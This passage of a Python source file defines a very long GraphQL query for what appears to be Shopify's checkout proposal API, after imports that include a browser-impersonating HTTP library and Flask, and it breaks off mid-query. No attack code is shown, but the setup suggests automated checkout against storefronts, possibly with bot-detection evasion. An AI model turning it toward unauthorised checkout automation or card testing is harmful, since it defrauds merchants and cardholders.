import asyncio
import aiohttp
import json
import re
import random
import argparse
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time
import html
from curl_cffi import requests as _curl_req

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on 